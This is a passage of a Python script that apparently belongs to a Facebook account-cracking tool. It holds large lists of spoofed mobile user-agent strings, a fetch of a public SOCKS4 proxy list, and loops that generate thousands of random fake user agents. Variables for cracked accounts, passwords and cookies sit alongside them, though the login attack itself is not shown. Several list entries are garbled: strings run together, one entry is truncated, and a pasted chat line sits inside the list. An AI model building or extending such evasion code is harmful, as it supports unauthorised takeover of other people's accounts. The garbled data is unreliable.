    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fi-fi) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) ,AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
    'Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_10 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8E600 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS_3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; CPU OS 4_3 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/8F190 Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_10 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8E600 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPad',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 1…',
    '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36']
ugen2 = [
    'Mozilla/5.0 (Linux; U; Android 7.0; es-us; 7.0; Redmi Note 4 Build/NRD90M)L659B) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4773.134 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2Mozilla/5.0 (Linux; U; Android 7.0; es-us; 12; Redmi Note 4 Build/NRD90M)G813D) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4860.149 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2']
ugen = [
    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64T449V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4571.73 Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-K580T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4806.44 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-L592D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4228.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 9;  en-us; GT-Y602C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4870.41 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 6;  en-us; GT-O209S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4789.51 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-E525L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4572.143 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-Q191U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4775.146 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 8;  en-us; GT-U702Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4514.138 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android  7.0; Mi 4i Build//L87A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4926.314 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android  5.0; xiaomi 6 Build/I105N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.3401.235 Mobile Safari/537.36']
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
except:
    print('𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺')
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android'
    b = random.choice([
        '2',
        '3',
        '4',
        '5',
        '5.2',
        '6',
        '6.0.1',
        '7',
        '8',
        '9',
        '10',
        '11',
        '11',
        '11.0.1',
        '12',
        '13'])
    c = random.choice([
        'OPPO A57 Build/MMB29M; wv'])
    d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e = random.randrange(80, 106)
    f = '0'
    g = random.randrange(3904, 5000)
    h = random.randrange(40, 100)
    i = 'MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
    uaku2 = f'''{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'''
    ugen.append(uaku2)
for x in range(10):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-SM-'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
L = '\x1b[0;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
#-----------------[ اتصالات ]--------------
os.system('clear')
_DF='\x1b[1;96m'
_DE='\x1b[1;92m'
_DD='\x1b[1;91m'
_DC='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36'
_DB='Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36'
_DA='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:47.0) Gecko/20100101 Firefox/47.0'
_D9='Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0'
_D8='Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0'
_D7='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:47.0) Gecko/20100101 Firefox/47.0'
_D6='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/5.0)'
_D5='Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko'
_D4='Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0'
_D3='Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.83 Safari/537.36'
_D2='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.183 Safari/537.36'
_D1='Mozilla/5.0 (Windows NT 5.1; rv:49.0) Gecko/20100101 Firefox/49.0'
_D0='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36'
_C_='Mozilla/5.0 (Windows NT 6.1; rv:47.0) Gecko/20100101 Firefox/47.0'
_Cz='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.183 Safari/537.36'
_Cy='Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.105 Safari/537.36'
_Cx='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36'
_Cw='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36'
_Cv='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.96 Safari/537.36'
_Cu='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36'
_Ct='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.114 Safari/537.36'
_Cs='Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0'
_Cr='Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'
_Cq='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.114 Safari/537.36'
_Cp='Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'
_Co='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0'
_Cn='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Trident/5.0)'
_Cm='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36'
_Cl='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36'
_Ck='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36'
_Cj='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
